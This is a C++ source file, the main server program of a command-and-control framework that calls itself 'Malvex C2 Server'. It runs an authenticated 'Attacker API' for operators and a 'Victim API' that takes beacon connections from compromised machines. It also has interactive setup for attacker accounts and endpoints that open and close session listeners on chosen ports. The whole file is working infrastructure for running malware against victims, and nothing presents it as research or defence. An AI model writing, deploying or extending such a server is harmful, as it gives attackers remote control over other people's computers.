#include <RESTServer.hpp>
#include <cpppwn.hpp>
#include <SQLiteCpp/SQLiteCpp.h>

#include <atomic>
#include <csignal>
#include <cstdint>
#include <fcntl.h>
#include <iostream>
#include <memory>
#include <poll.h>
#include <print>
#include <thread>
#include <unistd.h>
#include <stdlib.h>

#include <OperatorRepository.hpp>
#include <VictimRepository.hpp>
#include "HttpUtils.hpp"
#include "Util/SafeLogger.hpp"
#include "SessionManager.hpp"
#include "ServerContext.hpp"
#include "Types.hpp"
#include "Config.hpp"
#include "VictimTemplateRepository.hpp"
#include "OperatorAuthenticator.hpp"
#include "VictimTemplateAuthenticator.hpp"
#include "SessionConnectionAuthenticator.hpp"
#include "Services/SessionBridgeService.hpp"

#include <Endpoints.hpp>
#include <BeaconEndpoint.hpp>

static inline const std::string db_file{ "server.db" };
bool is_locally_run = false;

std::unique_ptr<IOperatorAuthenticator> g_operator_authenticator;
std::unique_ptr<IVictimTemplateAuthenticator> g_victim_template_authenticator;
std::unique_ptr<SessionConnectionAuthenticator> g_session_authenticator;
std::unique_ptr<SessionBridgeService> g_session_bridge_service;

namespace {
std::atomic<bool> g_running{true};
std::unique_ptr<cpppwn::RESTServer> g_attacker_api;
std::unique_ptr<cpppwn::RESTServer> g_victim_api;
int g_shutdown_pipe[2] = {-1, -1};

void shutdown_rest_servers() {
    if (g_attacker_api) {
        g_attacker_api->stop();
    }
    if (g_victim_api) {
        g_victim_api->stop();
    }
}

void handle_shutdown_signal(int) {
    if (g_shutdown_pipe[1] >= 0) {
        const char byte = 1;
        (void)write(g_shutdown_pipe[1], &byte, 1);
    }
    g_running = false;
}

bool init_shutdown_pipe() {
    if (pipe(g_shutdown_pipe) != 0) {
        return false;
    }
    fcntl(g_shutdown_pipe[0], F_SETFL, O_NONBLOCK);
    fcntl(g_shutdown_pipe[1], F_SETFL, O_NONBLOCK);
    return true;
}

void close_shutdown_pipe() {
    if (g_shutdown_pipe[0] >= 0) {
        close(g_shutdown_pipe[0]);
        g_shutdown_pipe[0] = -1;
    }
    if (g_shutdown_pipe[1] >= 0) {
        close(g_shutdown_pipe[1]);
        g_shutdown_pipe[1] = -1;
    }
}

void wait_for_shutdown_signal() {
    while (g_running.load(std::memory_order_relaxed)) {
        pollfd pfd{};
        pfd.fd = g_shutdown_pipe[0];
        pfd.events = POLLIN;
        const int ready = poll(&pfd, 1, 200);
        if (!g_running.load(std::memory_order_relaxed)) {
            break;
        }
        if (ready > 0 && (pfd.revents & POLLIN)) {
            char buffer[16];
            while (read(g_shutdown_pipe[0], buffer, sizeof(buffer)) > 0) {
            }
            break;
        }
    }
}

void detach_api_thread(std::thread& thread) noexcept {
    if (thread.joinable()) {
        thread.detach();
    }
}
} // namespace

void initial_setup();
void start_attacker_api(int16_t port);
void start_victim_api(int16_t port);

int main(int argc, char* argv[]) {
    if (!init_shutdown_pipe()) {
        logger::error("Failed to initialize shutdown pipe");
        return 1;
    }

    struct sigaction action{};
    action.sa_handler = handle_shutdown_signal;
    sigemptyset(&action.sa_mask);
    action.sa_flags = 0;
    sigaction(SIGINT, &action, nullptr);
    sigaction(SIGTERM, &action, nullptr);

    g_operator_authenticator = std::make_unique<OperatorAuthenticator>(db_file);
    g_victim_template_authenticator = std::make_unique<VictimTemplateAuthenticator>(db_file);
    g_session_authenticator = std::make_unique<SessionConnectionAuthenticator>(
        *g_operator_authenticator,
        *g_victim_template_authenticator);
    g_session_bridge_service = std::make_unique<SessionBridgeService>(SessionManager::instance());

    SessionManager::instance().set_session_authenticator(g_session_authenticator.get());

    ServerContext context{
        *g_operator_authenticator,
        *g_victim_template_authenticator,
        *g_session_authenticator,
        *g_session_bridge_service};

    (void)context;

    auto& config = Config::instance(db_file);

    for (int i = 1; i < argc; ++i) {
        if (std::string(argv[i]) == "--local") {
            is_locally_run = true;
            break;
        }
    }

    if (not is_locally_run && not config.has("attacker_api_port")) {
        initial_setup();
    }

    const int16_t attacker_port{ is_locally_run ? static_cast<int16_t>(1337) : config.get<int16_t>("attacker_api_port", 1337) };
    const int16_t victim_port{ is_locally_run ? static_cast<int16_t>(3000) : config.get<int16_t>("victim_api_port", 3000) };

    logger::info("Staring Attacker API on Port: {}", attacker_port);
    std::thread attacker_api_thread(start_attacker_api, attacker_port);

    logger::info("Staring Victim API on Port: {}", victim_port);
    std::thread victim_api_thread(start_victim_api, victim_port);

    wait_for_shutdown_signal();
    g_running = false;

    logger::info("Server shutting down...");

    SessionManager::instance().stop_all();
    shutdown_rest_servers();

    detach_api_thread(attacker_api_thread);
    detach_api_thread(victim_api_thread);

    g_attacker_api.reset();
    g_victim_api.reset();

    close_shutdown_pipe();
    _exit(0);
}

//-------------------------------------------------
//
//-------------------------------------------------
void initial_setup() {
    // Config
    {
        auto& config = Config::instance(db_file);

        std::println("This is your first time starting Malvex C2 Server");
        std::println("To get started, we need to set up some things!\n");

        // attacker port
        int16_t attacker_port;
        std::print("Attacker API Should Listen on Port:");
        std::cin >> attacker_port;
        config.set("attacker_api_port", attacker_port);

        // victim port
        int16_t victim_port;
        std::print("Victim API Should Listen on Port:");
        std::cin >> victim_port;
        config.set("victim_api_port", victim_port);

        std::println("Generating Server Certificates...");

        auto [attacker_cert, attacker_key] = cpppwn::Server::generate_self_signed_cert("./attacker");
        config.set("attacker_cert", attacker_cert);
        config.set("attacker_key", attacker_key);

        auto [victim_cert, victim_key] = cpppwn::Server::generate_self_signed_cert("./victim");
        config.set("victim_cert", victim_cert);
        config.set("victim_key", victim_key);

        config.save();
    }

    // Default user(s)
    std::println("You need to have at least one Attacker Account Set up!");
    bool create_user = true;
    OperatorRepository attacker_repo(db_file);
    do {
        OperatorDAO attacker;
        attacker.uid = generate_uuid();
        attacker.clearance = 100;

        std::print("Attacker Username:");
        std::cin >> attacker.username;

        std::print("Attacker password:");
        std::cin >> attacker.password;

        attacker_repo.create(attacker);

        std::println("user [{}] created!", attacker.username);

        std::print("Would you like to create another user? [Y / N]");
        std::string input;
        std::cin >> input;

        if(input.starts_with('Y') || input.starts_with('y')) {
            create_user = true;
        } else {
            create_user = false;
        }

    } while (create_user);
}

//-------------------------------------------------
//
//-------------------------------------------------
namespace {

[[nodiscard]] bool parse_basic_credentials(
    const HttpRequest& request,
    HttpResponse& response,
    std::string& username,
    std::string& password) {
    auto auth_header = request.get_header("Authorization");

    if (auth_header.empty()) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Authentication required"})");
        return false;
    }

    const std::string basic_prefix = "Basic ";
    if (auth_header.substr(0, basic_prefix.length()) != basic_prefix) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid authentication method"})");
        return false;
    }

    std::string encoded_credentials = auth_header.substr(basic_prefix.length());
    std::string decoded_credentials;

    try {
        decoded_credentials = base64_decode(encoded_credentials);
    } catch (...) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid credentials format"})");
        return false;
    }

    size_t colon_pos = decoded_credentials.find(':');
    if (colon_pos == std::string::npos) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid credentials format"})");
        return false;
    }

    username = decoded_credentials.substr(0, colon_pos);
    password = decoded_credentials.substr(colon_pos + 1);
    return true;
}

} // namespace

bool basic_auth_middleware(const HttpRequest& request, HttpResponse& response) {
    std::string username;
    std::string password;

    if (!parse_basic_credentials(request, response, username, password)) {
        std::println("Unauthorized: Authentication required");
        return false;
    }

    if (!g_operator_authenticator->authenticate(username, password)) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid username or password"})");
        std::println("Unauthorized: Invalid credentials for operator [{}]", username);
        return false;
    }

    return true;
}

//-------------------------------------------------
//
//-------------------------------------------------
bool victim_auth_middleware(const HttpRequest& request, HttpResponse& response) {
    std::string username;
    std::string password;

    if (!parse_basic_credentials(request, response, username, password)) {
        return false;
    }

    if (!g_victim_template_authenticator->authenticate(username, password)) {
        response.set_status(401);
        response.set_json(R"({"message":"Unauthorized: Invalid username or password"})");
        std::println("Unauthorized: Invalid credentials for victim template [{}]", username);
        return false;
    }

    return true;
}

//-------------------------------------------------
//
//-------------------------------------------------
static HttpResponse close_session_handler(const HttpRequest& req) {
    try{
        const auto port = std::atoi(req.query_params.at("port").c_str());
        SessionManager::instance().stop_listener(port);
        logger::success("Sessions Closed on Port: {}", port);
        return HttpResponse().set_json(R"("Session closed!")");
    } catch (...) {
        return HttpResponse().set_status(500);
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
static HttpResponse open_session_handler(const HttpRequest& req) {
    try{
        const auto port = std::atoi(req.query_params.at("port").c_str());
        SessionManager::instance().start_listener(port);
        logger::success("Sessions Started on Port: {}", port);
        return HttpResponse().set_json(R"("Session started!")");
    } catch (...) {
        return HttpResponse().set_status(500);
    }
}

//-------------------------------------------------
//
//-------------------------------------------------
void start_attacker_api(int16_t port) {
    using namespace cpppwn;
    auto& config = Config::instance(db_file);

    TlsConfig tls_conf{
        config.get<std::string>("attacker_cert"),
        config.get<std::string>("attacker_key")
    };

    g_attacker_api = std::make_unique<RESTServer>(port, tls_conf);
    RESTServer& attacker_api = *g_attacker_api;

    if (not is_locally_run) {
        attacker_api.use_middleware(basic_auth_middleware);
    }

    attacker_api.get("/auth", [](const HttpRequest& req) -> HttpResponse {
        (void) req;
        return HttpResponse().set_json(R"(true)");
    });

    attacker_api.get("/open_session", open_session_handler);
    attacker_api.get("/close_session", close_session_handler);

    register_attacker_endpoints(attacker_api);

    attacker_api.start();
}

void start_victim_api(int16_t port) {
    using namespace cpppwn;
    auto& config = Config::instance(db_file);

    TlsConfig tls_conf{
        config.get<std::string>("victim_cert"),
        config.get<std::string>("victim_key")
    };

    g_victim_api = std::make_unique<RESTServer>(port, tls_conf);
    RESTServer& victim_api = *g_victim_api;

    if (not is_locally_run) {
        victim_api.use_middleware(victim_auth_middleware);
    }

    register_all_beacon_endpoints(victim_api);

    victim_api.start();
}
